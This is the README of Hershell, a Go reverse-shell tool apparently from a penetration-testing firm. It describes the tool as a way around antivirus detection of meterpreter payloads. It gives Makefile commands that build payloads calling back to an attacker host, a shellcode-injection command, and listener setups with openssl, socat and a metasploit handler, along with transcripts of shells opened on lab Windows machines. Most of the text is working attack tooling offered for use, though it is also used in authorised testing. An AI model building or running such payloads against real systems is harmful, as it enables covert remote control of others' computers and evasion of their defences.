# Hershell

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

Supported OS are:

- Windows
- Linux
- Mac OS
- FreeBSD and derivatives

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.

The goal of this project is to get a simple reverse shell, which can work on multiple systems,

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)
- ``linux32`` : builds a linux 32 bits executable (ELF 32 bits)
- ``linux64`` : builds a linux 64 bits executable (ELF 64 bits)
- ``macos`` : builds a mac os 64 bits executable (Mach-O)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Using the shell

Once executed, you will be provided with a remote shell.
This custom interactive shell will allow you to execute system commands through `cmd.exe` on Windows, or `/bin/sh` on UNIX machines.

The following special commands are supported:

* ``run_shell`` : drops you an system shell (allowing you, for example, to change directories)
* ``inject <base64 shellcode>`` : injects a shellcode (base64 encoded) in the same process memory, and executes it (Windows only at the moment)
* ``meterpreter IP:PORT`` : connects to a multi/handler to get a stage2 reverse tcp meterpreter from metasploit, and execute the shellcode in memory (Windows only at the moment)
* ``exit`` : exit gracefully

## Examples

First of all, you will need to generate a valid certificate:
```bash
$ make depends
openssl req -subj '/CN=sysdream.com/O=Sysdream/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

For windows:

```bash
# Custom target
$ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Custom target
$ make GOOS=linux GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
```

For Mac OS X
```bash
$ make macos LHOST=192.168.0.12 LPORT=1234
```

## Listeners

On the server side, you can use the openssl integrated TLS server:

```bash
$ openssl s_server -cert server.pem -key server.key -accept 1234
Using default temp DH parameters
ACCEPT
bad gethostbyaddr
-----BEGIN SSL SESSION PARAMETERS-----
MHUCAQECAgMDBALALwQgsR3QwizJziqh4Ps3i+xHQKs9lvp5RfsYPWjEDB68Z4kE
MHnP0OD99CHv2u27THKvCHCggKEpgrPnKH+vNGJGPJZ42QylfkekhSwY5Mtr5qYI
5qEGAgRYgSfgogQCAgEspAYEBAEAAAA=
-----END SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA
Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
Shared Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
Supported Elliptic Curve Point Formats: uncompressed
Supported Elliptic Curves: P-256:P-384:P-521
Shared Elliptic curves: P-256:P-384:P-521
CIPHER is ECDHE-RSA-AES128-GCM-SHA256
Secure Renegotiation IS supported
Microsoft Windows [version 10.0.10586]
(c) 2015 Microsoft Corporation. Tous droits rservs.

C:\Users\LAB2\Downloads>
```

Or even better, use socat with its __readline__ module, which gives you a handy history feature:

```bash
$ socat readline openssl-listen:1234,fork,reuseaddr,verify=0,cert=server.pem
Microsoft Windows [version 10.0.10586]
(c) 2015 Microsoft Corporation. Tous droits rservs.

C:\Users\LAB2\Downloads>
```

Or, and this is great, use a metasploit handler:

```bash
[172.17.0.2][Sessions: 0][Jobs: 0]: > use exploit/multi/handler
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set payload python/shell_reverse_tcp_ssl
payload => python/shell_reverse_tcp_ssl
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set lhost 192.168.122.1
lhost => 192.168.122.1
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set lport 4444
lport => 4444
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set handlersslcert /tmp/data/server.pem
handlersslcert => /tmp/data/server.pem
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > set exitonsession false
exitonsession => false
[172.17.0.2][Sessions: 0][Jobs: 0]: exploit(handler) > exploit -j
[*] Exploit running as background job.

[-] Handler failed to bind to 192.168.122.1:4444
[*] Started reverse SSL handler on 0.0.0.0:4444
[*] Starting the payload handler...
[172.17.0.2][Sessions: 0][Jobs: 1]: exploit(handler) >
[*] Command shell session 1 opened (172.17.0.2:4444 -> 172.17.0.1:51995) at 2017-02-09 12:07:51 +0000
[172.17.0.2][Sessions: 1][Jobs: 1]: exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

Microsoft Windows [version 10.0.10586]
(c) 2015 Microsoft Corporation. Tous droits rservs.

C:\Users\lab1\Downloads>whoami
whoami
desktop-jcfs2ok\lab1

C:\Users\lab1\Downloads>
```

## Credits

Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
